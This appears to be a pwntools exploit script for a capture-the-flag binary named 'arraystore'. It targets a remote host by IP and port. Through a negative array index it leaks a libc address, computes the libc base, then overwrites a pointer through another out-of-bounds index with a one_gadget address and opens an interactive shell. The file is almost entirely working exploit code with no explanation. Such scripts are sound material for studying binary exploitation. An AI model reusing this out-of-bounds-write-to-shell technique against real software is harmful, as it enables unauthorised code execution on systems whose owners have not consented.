#!/usr/bin/env python3

from pwn import *
import time
import sys

local = 0
debug = 0

context.arch = 'amd64'
# context.aslr = False
context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# context.timeout = 2

def conn():
	global local
	global debug

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('./arraystore')
		if debug:
			gdb.attach(s, gdbscript='''
              b*main+0x0000000000001208
			''')
		else:
			raw_input('DEBUG')
	else:
		s = remote('34.124.157.94', 10546)

	return s

s = conn()

elf = ELF('arraystore')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def read(idx:bytes):
    s.sendlineafter(b'Read/Write?: ', b'R')
    s.sendlineafter(b'Index: ', idx)
    s.recvuntil(b'Value: ')
    return s.recvline().strip(b'\n')
    
def write(idx:bytes, offset:bytes):
    s.sendlineafter(b'Read/Write?: ', b'W')
    s.sendlineafter(b'Index: ', idx)
    return s.sendlineafter(b'Value: ', offset)

leak = read(b'-12')
leak = int(leak.decode()) 
sleep(1)
log.info('Leak _IO_2_1_stdin_ : ' + hex(leak))
sleep(1)
libc_leak = leak - libc.sym['_IO_2_1_stdin_']
log.info('Leak libc : ' + hex(libc_leak))


og = [0xebcf8+libc_leak, 0xebcf5+libc_leak, 0xebcf1+libc_leak]

read(b'-21')

write(b'-21', p64(og[1]))



s.interactive()

